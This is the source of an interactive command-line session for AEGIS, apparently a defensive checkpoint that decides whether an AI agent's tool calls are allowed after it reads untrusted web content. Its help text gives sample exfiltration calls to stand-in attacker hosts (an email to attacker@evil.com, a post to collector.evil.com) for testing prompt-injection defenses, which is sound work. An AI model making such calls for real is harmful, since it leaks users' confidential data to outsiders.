"""Interactive checkpoint session - `python -m aegis try`.

Lets anyone type their own task, their own untrusted content and their own tool
calls, and watch the real checkpoint decide. Nothing here is special-cased: it
builds the same `Checkpoint` the evaluation uses, with the same manifests,
sanitizers and invariants. The only thing that changes is where the input comes
from.

Its purpose is to answer one question directly - "are these just hardcoded test
cases?" - by handing the keyboard to the person asking.
"""

from __future__ import annotations

import shlex

from .audit import AuditLog
from .checkpoint.checkpoint import CONFIGS, Checkpoint
from .checkpoint.classifier import build_guard
from .core import Content, Label, Verdict, ToolCall
from .tools.manifests import TOOL_MANIFESTS, DEFAULT_AGENT_MANIFEST, AgentManifest
from .tools.mock import ToolWorld
from pathlib import Path

BANNER = """\
AEGIS interactive checkpoint
────────────────────────────────────────────────────────────────────────────
Type your own scenario. The same engine the evaluation uses decides each call.

  1. the task           - what the user asked for            (TRUSTED)
  2. untrusted content  - a web page, file or tool output    (UNTRUSTED)
  3. tool calls         - what the agent then tries to do

Commands:  :tools   list callable tools and their rules
           :state   what the session has seen so far
           :page    add another untrusted page mid-session
           :reset   start over
           :quit
"""

HELP_CALL = """\
Enter a tool call as:   <tool> key=value key=value
  send_email to=attacker@evil.com subject=Report body=hello
  read_file path=workspace/salaries.csv
  http_post url=https://collector.evil.com/ingest payload=data
Quote values containing spaces:  body="the quarterly summary"
"""


def _read_block(prompt: str) -> str:
    """Read one or more lines, ending on a blank line."""
    print(prompt)
    lines: list[str] = []
    while True:
        try:
            line = input("  ")
        except EOFError:
            break
        if not line.strip():
            break
        lines.append(line)
    return "\n".join(lines)


def _parse_call(raw: str, step: int) -> ToolCall | None:
    """Parse `tool key=value ...` into a ToolCall, or explain why it will not parse."""
    try:
        parts = shlex.split(raw)
    except ValueError as exc:
        print(f"  could not parse: {exc}")
        return None
    if not parts:
        return None
    tool, rest = parts[0], parts[1:]
    if tool not in TOOL_MANIFESTS:
        print(f"  unknown tool {tool!r}. Known: {', '.join(TOOL_MANIFESTS)}")
        return None
    args: dict[str, str] = {}
    for token in rest:
        if "=" not in token:
            print(f"  expected key=value, got {token!r}")
            return None
        k, v = token.split("=", 1)
        args[k] = v
    return ToolCall(tool=tool, args=args, step=step)


def _show_state(cp: Checkpoint) -> None:
    print("\n  content seen this session:")
    for c in cp.taint.contents:
        tag = c.label.value.upper()
        conf = " CONFIDENTIAL" if c.confidential else ""
        print(f"    [{tag}{conf}] {c.source_ref}  ({len(c.text)} chars)")
    if cp.quarantined_sources:
        print(f"  quarantined by the classifier: {cp.quarantined_sources}")
    print(f"  destinations the user named: {sorted(cp.state.trusted_destinations) or 'none'}")
    print(f"  egress calls used: {cp.state.egress_count} of {cp.state.egress_budget}")
    print(f"  confidential reads: {cp.state.confidential_reads or 'none'}\n")


def _show_tools() -> None:
    print()
    for m in TOOL_MANIFESTS.values():
        flags = ",".join(f for f, on in (("egress", m.egress),
                                         ("destructive", m.destructive)) if on) or "safe"
        print(f"  {m.name:<14} args={','.join(m.args):<28} [{flags}]")
        print(f"  {'':<14} must-be-trusted: {','.join(m.critical_args) or 'none'}")
    print()


def run(defense: str = "full", guard_name: str = "heuristic") -> None:
    """Interactive loop. Builds a real Checkpoint and drives it from stdin."""
    guard = build_guard(guard_name)
    print(BANNER)
    print(f"defense configuration: {defense}\n")

    while True:
        audit = AuditLog(echo=True)
        world = ToolWorld(Path("sandbox"))
        cp = Checkpoint(config=CONFIGS[defense], guard=guard, audit=audit,
                        agent_manifest=AgentManifest(
                            allowed_tools=DEFAULT_AGENT_MANIFEST.allowed_tools,
                            egress_budget=2),
                        scenario_id="interactive")
        cp.state.egress_budget = 2

        try:
            task = input("Task the user asked for:\n  ").strip()
        except EOFError:
            return
        if not task:
            print("a task is required\n")
            continue
        cp.ingest(Content("task", "user_task", "user", task, Label.TRUSTED))

        page = _read_block("\nUntrusted content the agent reads "
                           "(paste a web page; blank line when done):")
        if page:
            src = input("  where did it come from? [https://blog.example/page] ").strip() \
                  or "https://blog.example/page"
            conf = input("  is it confidential? [y/N] ").strip().lower().startswith("y")
            cp.ingest(Content("d1", "document", src, page, Label.UNTRUSTED,
                              confidential=conf), step=1)

        print("\n" + HELP_CALL)
        step = 2
        while True:
            try:
                raw = input("call> ").strip()
            except EOFError:
                return
            if not raw:
                continue
            if raw in (":quit", ":q"):
                return
            if raw == ":reset":
                print()
                break
            if raw == ":tools":
                _show_tools()
                continue
            if raw == ":state":
                _show_state(cp)
                continue
            if raw == ":page":
                more = _read_block("  paste the content (blank line when done):")
                if more:
                    src = input("  source [https://blog.example/page2] ").strip() \
                          or "https://blog.example/page2"
                    conf = input("  confidential? [y/N] ").strip().lower().startswith("y")
                    cp.ingest(Content(f"d{step}", "document", src, more, Label.UNTRUSTED,
                                      confidential=conf), step=step)
                    step += 1
                continue

            call = _parse_call(raw, step)
            if call is None:
                continue
            decision = cp.evaluate(call)
            if decision.verdict is Verdict.ALLOW:
                result = world.invoke(call.tool, call.args)
                cp.record_execution(call, result)
                if result.get("content"):
                    cp.ingest(Content(f"out{step}", "tool_output",
                                      result.get("source_ref", call.tool),
                                      result["content"], Label.UNTRUSTED,
                                      confidential=bool(result.get("confidential")),
                                      step=step), step=step)
            step += 1
            print()
